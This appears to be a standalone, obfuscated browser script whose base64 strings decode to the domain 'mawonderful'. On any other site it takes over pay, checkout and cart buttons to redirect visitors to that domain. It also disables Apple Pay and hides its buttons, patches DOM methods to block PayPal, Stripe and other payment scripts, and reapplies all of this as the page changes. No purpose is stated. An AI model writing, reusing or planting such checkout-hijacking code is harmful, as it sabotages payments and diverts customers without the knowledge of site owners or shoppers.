(function () {
  const _0xhost = atob('bWF3b25kZXJmdWw='), _0xredirect = atob('aHR0cHM6Ly93d3cubWF3b25kZXJmdWwuY29t');

  if (!window['location']['hostname']['includes'](_0xhost)) {
    function _block(e) {
      e?.preventDefault?.();
      e?.stopImmediatePropagation?.();
      window['location']['href'] = _0xredirect;
      return false;
    }

    const _blockApple = () => {
      document.querySelectorAll('apple-pay-button,[id*="apple-pay"],[class*="apple-pay"]').forEach(b => b.onclick = _block);
      if (window.ApplePaySession) {
        window.ApplePaySession.canMakePayments = () => false;
        window.ApplePaySession.supportsVersion = () => false;
      }
      const _original = document.createElement;
      document.createElement = function (tag, opts) {
        if (tag.toLowerCase() === 'apple-pay-button') {
          const d = _original.call(this, 'div');
          d.style.display = 'none';
          return d;
        }
        return _original.apply(this, arguments);
      };
    };

    const _intercept = () => {
      const keys = ['pay', 'checkout', 'purchase', 'add to cart', 'buy now', '信用卡', 'debit', 'google pay', 'shopify', 'stripe', 'paypal'];
      document.querySelectorAll('button,a,form,[onclick],[role="button"],[class*="pay"],[id*="pay"],[class*="checkout"]').forEach(el => {
        const txt = (el.textContent + el.id + el.className).toLowerCase();
        if (keys.some(k => txt.includes(k))) {
          el.onclick = _block;
        }
      });
    };

    const _observer = new MutationObserver((muts) => {
      muts.forEach(m => {
        if (m.addedNodes.length) {
          _intercept();
          _blockApple();
        }
      });
    });

    document.addEventListener('DOMContentLoaded', () => {
      _intercept();
      _blockApple();
      _observer.observe(document.body, { childList: true, subtree: true });
    });

    const _append = Element.prototype.appendChild;
    Element.prototype.appendChild = function (el) {
      if (/paypal|checkout|stripe|payment|apple-pay/i.test(el.src || el.innerHTML || '')) {
        return el;
      }
      return _append.apply(this, arguments);
    };
  }
})();
